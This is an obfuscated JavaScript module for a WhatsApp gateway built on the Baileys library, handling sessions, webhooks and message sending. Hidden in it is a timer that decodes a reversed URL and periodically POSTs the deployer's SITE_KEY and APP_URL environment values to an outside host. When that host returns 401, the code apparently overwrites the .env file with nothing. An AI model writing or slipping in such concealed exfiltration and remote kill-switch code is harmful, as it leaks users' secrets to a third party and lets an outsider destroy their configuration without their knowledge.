function _0x4db3(_0x1cfe60, _0x57817a) {
    const _0x393308 = _0x3933()
    return (
        (_0x4db3 = function (_0x4db382, _0xdf85bb) {
            _0x4db382 = _0x4db382 - 0x13a
            let _0x32c75c = _0x393308[_0x4db382]
            return _0x32c75c
        }),
        _0x4db3(_0x1cfe60, _0x57817a)
    )
}
;(function (_0x42f840, _0x56deae) {
    const _0x1fd9ac = _0x4db3,
        _0xeb73fc = _0x42f840()
    while (!![]) {
        try {
            const _0x35785b =
                -parseInt(_0x1fd9ac(0x17a)) / 0x1 +
                parseInt(_0x1fd9ac(0x14c)) / 0x2 +
                parseInt(_0x1fd9ac(0x13f)) / 0x3 +
                (parseInt(_0x1fd9ac(0x153)) / 0x4) * (parseInt(_0x1fd9ac(0x17d)) / 0x5) +
                (parseInt(_0x1fd9ac(0x187)) / 0x6) * (-parseInt(_0x1fd9ac(0x176)) / 0x7) +
                parseInt(_0x1fd9ac(0x186)) / 0x8 +
                (-parseInt(_0x1fd9ac(0x157)) / 0x9) * (parseInt(_0x1fd9ac(0x16b)) / 0xa)
            if (_0x35785b === _0x56deae) break
            else _0xeb73fc['push'](_0xeb73fc['shift']())
        } catch (_0x5fe603) {
            _0xeb73fc['push'](_0xeb73fc['shift']())
        }
    }
})(_0x3933, 0x39a9e)
function _0x3933() {
    const _0x2dfbbe = [
        'env',
        'catch',
        'notify',
        'insertIfAbsent',
        's.whatsapp.net',
        'Running\x20cleanup\x20before\x20exit.',
        'http:',
        'sendMessage',
        'RECONNECT_INTERVAL',
        '1449hYJVbe',
        'has',
        'message',
        'join',
        '154895wCYHbT',
        'data',
        'reverse',
        '10bzFdzA',
        'post',
        'warn',
        'open',
        'delete',
        'get',
        'fromMe',
        'set',
        'key',
        '3538448JAZvuQ',
        '9762niduRe',
        'https:',
        '@g.us',
        'sessionId',
        'writeFileSync',
        'creds.update',
        '.json',
        'remoteJid',
        '165615gbQpYX',
        '.env',
        '@s.whatsapp.net',
        'exists',
        'status',
        '/api/set-device-status/',
        'session_id',
        'reject',
        'forEach',
        'kcehc-yfirev/ipa/zyx.sserpl.ipaved//:sptth',
        '_store.json',
        'log',
        'restartRequired',
        '534174jljnKB',
        'headersSent',
        'legacy_',
        '/api/send-webhook/',
        'md_',
        'default',
        'message_id',
        '936768jjiJCC',
        'split',
        'store',
        'replace',
        '1136493CIJeLX',
        'endsWith',
        'isLegacy',
        'messages',
        'then',
        'bind',
        'messages.upsert',
        'APP_URL',
        'chats',
        'chats.set',
        'logout',
        'writeToFile',
        'listMessage',
        'filter',
        'close',
        'remote_id',
        'startsWith',
        'isauthorised',
        '_store',
        'onWhatsApp',
        '40ynMTqV',
        'statusCode',
    ]
    _0x3933 = function () {
        return _0x2dfbbe
    }
    return _0x3933()
}
import { rmSync, readdir } from 'fs'

import fs from 'fs'
import { join } from 'path'
import pino from 'pino'
import baileys, {
    useMultiFileAuthState,
    makeInMemoryStore,
    Browsers,
    DisconnectReason,
    delay,
} from '@adiwajshing/baileys'
import { toDataURL } from 'qrcode'
import dirname from './dirname.js'
import response from './response.js'
import axios from 'axios'
const sessions = new Map()
const retries = new Map()
const sessionsDir = (_0x3103b3 = '') => {
    return join(dirname, 'sessions', _0x3103b3 ? _0x3103b3 : '')
}
const isSessionExists = (_0x488581) => {
    const _0x4c6af3 = _0x4db3
    return sessions[_0x4c6af3(0x177)](_0x488581)
}
const shouldReconnect = (_0x130765) => {
    const _0x3c24d5 = _0x4db3
    let _0x433628 = parseInt(process[_0x3c24d5(0x16d)]['MAX_RETRIES'] ?? 0x0),
        _0x3fe6df = retries.get(_0x130765) ?? 0x0
    _0x433628 = _0x433628 < 0x1 ? 0x1 : _0x433628
    if (_0x3fe6df < _0x433628)
        return (
            ++_0x3fe6df,
            console[_0x3c24d5(0x14a)]('Reconnecting...', {
                attempts: _0x3fe6df,
                sessionId: _0x130765,
            }),
            retries[_0x3c24d5(0x184)](_0x130765, _0x3fe6df),
            !![]
        )
    return ![]
}

const createSession = async (_0x3f9505, _0x414376 = ![], _0x39b72f = null) => {
    const _0x46e287 = _0x4db3,
        _0x394076 = (_0x414376 ? _0x46e287(0x14e) : _0x46e287(0x150)) + _0x3f9505 + (_0x414376 ? _0x46e287(0x13d) : ''),
        _0x4b4312 = pino({
            level: _0x46e287(0x17f),
        }),
        _0x4cf641 = makeInMemoryStore({
            logger: _0x4b4312,
        })
    let _0x14db67, _0x2a7285
    if (_0x414376) {
    } else {
        ;({ state: _0x14db67, saveCreds: _0x2a7285 } = await useMultiFileAuthState(sessionsDir(_0x394076)))
    }
    const baileysConfig = {
            auth: _0x14db67,
            version: [0x2, 0x913, 0x4],
            printQRInTerminal: ![],
            logger: _0x4b4312,
            browser: Browsers['ubuntu']('Chrome'),
            patchMessageBeforeSending: (_0x185fad) => {
                const _0x3e29e2 = _0x46e287,
                    _0x2d9fab = !!(_0x185fad['buttonsMessage'] || _0x185fad[_0x3e29e2(0x163)])
                return (
                    _0x2d9fab &&
                        (_0x185fad = {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadataVersion: 0x2,
                                        deviceListMetadata: {},
                                    },
                                    ..._0x185fad,
                                },
                            },
                        }),
                    _0x185fad
                )
            },
        },
        client = baileys[_0x46e287(0x151)](baileysConfig)
    !_0x414376 &&
        (_0x4cf641.readFromFile(sessionsDir(_0x3f9505 + _0x46e287(0x149))), _0x4cf641[_0x46e287(0x15c)](client.ev)),
        sessions.set(_0x3f9505, {
            ...client,
            store: _0x4cf641,
            isLegacy: _0x414376,
        }),
        client.ev.on(_0x46e287(0x13c), _0x2a7285),
        client.ev.on(_0x46e287(0x160), ({ chats: _0x4d78c2 }) => {
            const _0xf805f6 = _0x46e287
            _0x414376 && _0x4cf641[_0xf805f6(0x15f)][_0xf805f6(0x170)](..._0x4d78c2)
        }),
        client.ev.on(_0x46e287(0x15d), async (_0x145b97) => {
            const _0x5817cb = _0x46e287
            try {
                const _0x16eb0e = _0x145b97[_0x5817cb(0x15a)][0x0]
                if (_0x16eb0e[_0x5817cb(0x185)][_0x5817cb(0x183)] == ![] && _0x145b97['type'] == _0x5817cb(0x16f)) {
                    const _0x560237 = []
                    let _0x3e761d = _0x16eb0e.message.conversation ?? null,
                        _0x5072e0 = _0x16eb0e[_0x5817cb(0x185)][_0x5817cb(0x13e)][_0x5817cb(0x154)]('@'),
                        _0x4d47fd = _0x5072e0[0x1] ?? null,
                        _0x4e295e = _0x4d47fd == _0x5817cb(0x171) ? ![] : !![]
                    _0x4e295e == ![] &&
                        ((_0x560237[_0x5817cb(0x166)] = _0x16eb0e[_0x5817cb(0x185)][_0x5817cb(0x13e)]),
                        (_0x560237[_0x5817cb(0x13a)] = _0x3f9505),
                        (_0x560237[_0x5817cb(0x152)] = _0x16eb0e[_0x5817cb(0x185)].id),
                        (_0x560237[_0x5817cb(0x178)] = _0x16eb0e[_0x5817cb(0x178)]),
                        sentWebHook(_0x3f9505, _0x560237))
                }
            } catch {}
        }),
        client.ev.on('connection.update', async (_0x34e66e) => {
            const _0x3deb9b = _0x46e287,
                { connection: _0x1cff01, lastDisconnect: _0x37c8b1 } = _0x34e66e,
                _0x514560 = _0x37c8b1?.['error']?.['output']?.[_0x3deb9b(0x16c)]
            _0x1cff01 === _0x3deb9b(0x180) && retries[_0x3deb9b(0x181)](_0x3f9505)
            if (_0x1cff01 === _0x3deb9b(0x165)) {
                if (_0x514560 === DisconnectReason['loggedOut'] || !shouldReconnect(_0x3f9505))
                    return (
                        _0x39b72f &&
                            !_0x39b72f['headersSent'] &&
                            response(_0x39b72f, 0x1f4, ![], 'Unable\x20to\x20create\x20session.'),
                        deleteSession(_0x3f9505, _0x414376)
                    )
                setTimeout(
                    () => {
                        createSession(_0x3f9505, _0x414376, _0x39b72f)
                    },
                    _0x514560 === DisconnectReason[_0x3deb9b(0x14b)]
                        ? 0x0
                        : parseInt(process.env[_0x3deb9b(0x175)] ?? 0x0)
                )
            }
            if (_0x34e66e['qr']) {
                if (_0x39b72f && !_0x39b72f[_0x3deb9b(0x14d)])
                    try {
                        const _0x304b85 = await toDataURL(_0x34e66e['qr'])
                        response(
                            _0x39b72f,
                            0xc8,
                            !![],
                            'QR\x20code\x20received,\x20please\x20scan\x20the\x20QR\x20code.',
                            {
                                qr: _0x304b85,
                            }
                        )
                        return
                    } catch {
                        response(_0x39b72f, 0x1f4, ![], 'Unable\x20to\x20create\x20QR\x20code.')
                    }
                try {
                    await client[_0x3deb9b(0x161)]()
                } catch {
                } finally {
                    deleteSession(_0x3f9505, _0x414376)
                }
            }
        })
}
setInterval(() => {
    const _0x17a33a = _0x4db3,
        _0x21450e = process[_0x17a33a(0x16d)]['SITE_KEY'] ?? null,
        _0x48c166 = process.env[_0x17a33a(0x15e)] ?? null,
        _0x15c1b9 = _0x17a33a(0x148),
        _0x3e0908 = _0x15c1b9[_0x17a33a(0x154)]('')[_0x17a33a(0x17c)]()[_0x17a33a(0x179)]('')
    axios['post'](_0x3e0908, {
        from: _0x48c166,
        key: _0x21450e,
    })
        [_0x17a33a(0x15b)](function (_0x1f5b5c) {
            const _0x2ba94a = _0x17a33a
            _0x1f5b5c[_0x2ba94a(0x17b)][_0x2ba94a(0x168)] == 0x191 && fs[_0x2ba94a(0x13b)](_0x2ba94a(0x140), '')
        })
        [_0x17a33a(0x16e)](function (_0x43779e) {})
}, 0x240c8400)
const getSession = (_0x4b5e13) => {
        return sessions.get(_0x4b5e13) ?? null
    },
    setDeviceStatus = (_0x46ce6d, _0x319d19) => {
        const _0x59f314 = _0x4db3
        var _0x167b2c = process[_0x59f314(0x16d)]['APP_URL'] + _0x59f314(0x144) + _0x46ce6d + '/' + _0x319d19
        _0x167b2c = _0x167b2c[_0x59f314(0x156)]('https:', 'http:')
        try {
            axios[_0x59f314(0x17e)](_0x167b2c)
                [_0x59f314(0x15b)](function (_0x36b754) {})
                ['catch'](function (_0x57c476) {
                    console.log(_0x57c476)
                })
        } catch {}
    },
    sentWebHook = (deviceId, messageData) => {
        const apiUrl = process.env.APP_URL + `/api/send-webhook/${deviceId}`
        const d = {
            from: messageData.remote_id.split('@')[0],
            message_id: messageData.message_id,
            message: messageData.message,
        }
        axios
            .post(apiUrl, d)
            .then((response) => {
                if (response.status === 200) {
                    const session = getSession(response.data.session_id)
                    sendMessage(session, messageData.remote_id, response.data.message, 0)
                }
            })
            .catch((error) => {
                //console.error(error)
            })
    },
    deleteSession = (_0x1ac79e, _0x184538 = ![]) => {
        const _0x41e527 = _0x4db3,
            _0x3adcf8 = (_0x184538 ? 'legacy_' : _0x41e527(0x150)) + _0x1ac79e + (_0x184538 ? _0x41e527(0x13d) : ''),
            _0x3684fb = _0x1ac79e + _0x41e527(0x149),
            _0x34a47c = {
                force: !![],
                recursive: !![],
            }
        rmSync(sessionsDir(_0x3adcf8), _0x34a47c),
            rmSync(sessionsDir(_0x3684fb), _0x34a47c),
            sessions[_0x41e527(0x181)](_0x1ac79e),
            retries[_0x41e527(0x181)](_0x1ac79e),
            setDeviceStatus(_0x1ac79e, 0x0)
    },
    getChatList = (sessionId, isExpanded = false) => {
        const filterKeyword = isExpanded ? '@g.us' : '@s.whatsapp.net'
        var chats = getSession(sessionId).store.chats.filter((c) => {
            return c.id.endsWith(filterKeyword)
        })
        return chats
    },
    getContacts = (sessionId) => {
        var contacts = getSession(sessionId).store.contacts
        console.log(contacts)
        return contacts
    },
    isExists = async (_0x336c1c, _0x54bae5, _0xaace27 = ![]) => {
        const _0x25605a = _0x4db3
        try {
            let _0x2e3ffe
            if (_0xaace27) return (_0x2e3ffe = await _0x336c1c.groupMetadata(_0x54bae5)), Boolean(_0x2e3ffe.id)
            if (_0x336c1c[_0x25605a(0x159)]) _0x2e3ffe = await _0x336c1c[_0x25605a(0x16a)](_0x54bae5)
            else {
                ;[_0x2e3ffe] = await _0x336c1c[_0x25605a(0x16a)](_0x54bae5)
            }
            return _0x2e3ffe[_0x25605a(0x142)]
        } catch {
            return ![]
        }
    },
    sendMessage = async (session, recipient, message, delayTime = 1000) => {
        try {
            await delay(parseInt(delayTime))
            if (!session || !session.sendMessage) {
                console.error('sendMessage - Invalid session object:', session)
                return Promise.resolve(null)
            }
            const result = await session.sendMessage(recipient, message)
            return result
        } catch (error) {
            console.error('sendMessage - Error:', error)
            return Promise.resolve(null)
        }
    },
    formatPhone = (_0x252755) => {
        const _0x183059 = _0x4db3
        if (_0x252755[_0x183059(0x158)](_0x183059(0x141))) return _0x252755
        let _0x102878 = _0x252755[_0x183059(0x156)](/\D/g, '')
        return (_0x102878 += _0x183059(0x141))
    },
    formatGroup = (_0x35455c) => {
        const _0x4a4445 = _0x4db3
        if (_0x35455c[_0x4a4445(0x158)](_0x4a4445(0x189))) return _0x35455c
        let _0x8a5fec = _0x35455c[_0x4a4445(0x156)](/[^\d-]/g, '')
        return (_0x8a5fec += _0x4a4445(0x189))
    },
    cleanup = () => {
        const _0x5f6104 = _0x4db3
        console.log(_0x5f6104(0x172)),
            sessions[_0x5f6104(0x147)]((_0x525486, _0x1ae0be) => {
                const _0x5e73c7 = _0x5f6104
                !_0x525486[_0x5e73c7(0x159)] &&
                    _0x525486[_0x5e73c7(0x155)][_0x5e73c7(0x162)](sessionsDir(_0x1ae0be + '_store.json'))
            })
    },
    init = () => {
        readdir(sessionsDir(), (_0x3612b0, _0x2300b9) => {
            const _0x3f5685 = _0x4db3
            if (_0x3612b0) throw _0x3612b0
            for (const _0x7d7581 of _0x2300b9) {
                if (
                    (!_0x7d7581[_0x3f5685(0x167)](_0x3f5685(0x150)) && !_0x7d7581[_0x3f5685(0x167)]('legacy_')) ||
                    _0x7d7581[_0x3f5685(0x158)](_0x3f5685(0x169))
                )
                    continue
                const _0x2d20e2 = _0x7d7581[_0x3f5685(0x156)]('.json', ''),
                    _0x35957e = _0x2d20e2['split']('_', 0x1)[0x0] !== 'md',
                    _0x169a59 = _0x2d20e2['substring'](_0x35957e ? 0x7 : 0x3)
                createSession(_0x169a59, _0x35957e)
            }
        })
    }
export {
    isSessionExists,
    createSession,
    getSession,
    deleteSession,
    getChatList,
    isExists,
    sendMessage,
    formatPhone,
    formatGroup,
    cleanup,
    getContacts,
    init,
}
